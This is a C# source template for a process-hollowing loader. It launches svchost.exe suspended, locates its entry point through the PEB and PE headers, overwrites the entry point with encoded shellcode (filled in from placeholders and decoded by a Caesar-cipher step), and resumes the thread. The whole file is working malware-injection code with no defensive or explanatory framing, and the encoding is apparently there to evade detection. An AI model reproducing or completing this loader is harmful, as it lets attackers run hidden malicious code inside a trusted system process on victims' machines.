using System.Runtime.InteropServices; 
using System.Text; 

namespace Hollowing 
{ 
	class Program 
	{ 
		// Importing apis
		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] 
		static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
		
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)] 
		struct STARTUPINFO 
		{ 
			public Int32 cb; 
			public IntPtr lpReserved; 
			public IntPtr lpDesktop; 
			public IntPtr lpTitle; 
			public Int32 dwX; 
			public Int32 dwY; 
			public Int32 dwXSize; 
			public Int32 dwYSize; 
			public Int32 dwXCountChars; 
			public Int32 dwYCountChars; 
			public Int32 dwFillAttribute; 
			public Int32 dwFlags; 
			public Int16 wShowWindow; 
			public Int16 cbReserved2; 
			public IntPtr lpReserved2; 
			public IntPtr hStdInput; 
			public IntPtr hStdOutput; 
			public IntPtr hStdError; 
		}
		
		[StructLayout(LayoutKind.Sequential)] 
		internal struct PROCESS_INFORMATION 
		{ 
			public IntPtr hProcess; 
			public IntPtr hThread; 
			public int dwProcessId; 
			public int dwThreadId; 
		}

		// API needed to find PEB
		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)] 
		private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
		
		[StructLayout(LayoutKind.Sequential)] 
		internal struct PROCESS_BASIC_INFORMATION 
		{ 
			public IntPtr Reserved1; 
			public IntPtr PebAddress; 
			public IntPtr Reserved2; 
			public IntPtr Reserved3;
			public IntPtr UniquePid; 
			public IntPtr MoreReserved; 
		}
		
		[DllImport("kernel32.dll", SetLastError = true)] 
		static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
		
		
		[DllImport("kernel32.dll")] 
		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
		
		[DllImport("kernel32.dll", SetLastError = true)] 
		private static extern uint ResumeThread(IntPtr hThread);
		
		static void Main(string[] args) 
		{ 
			// Starting process
			STARTUPINFO si = new STARTUPINFO(); 
			PROCESS_INFORMATION pi = new PROCESS_INFORMATION(); 
			
			bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
		
			// Finding PEB
			PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION(); 
			uint tmp = 0; 
			IntPtr hProcess = pi.hProcess; 
			ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp); IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
			
			// ReadProcessMemory to fetch the address of the code base by reading eight bytes of memory
			byte[] addrBuf = new byte[IntPtr.Size]; 
			IntPtr nRead = IntPtr.Zero; 
			ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead); 
			IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
			
			// Locating EntryPoint
			byte[] data = new byte[0x200]; 
			ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
			
			uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C); 
			uint opthdr = e_lfanew_offset + 0x28; 
			uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr); IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
			
			// C# shellcode
			%ENCSHELLCODE%
        
            //Decoding shellcode with Cesar Cipher
            //for(int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            //}

			%DECODER%
			
			WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

			// Reasuming halted thread
			ResumeThread(pi.hThread);
		}
	}
}	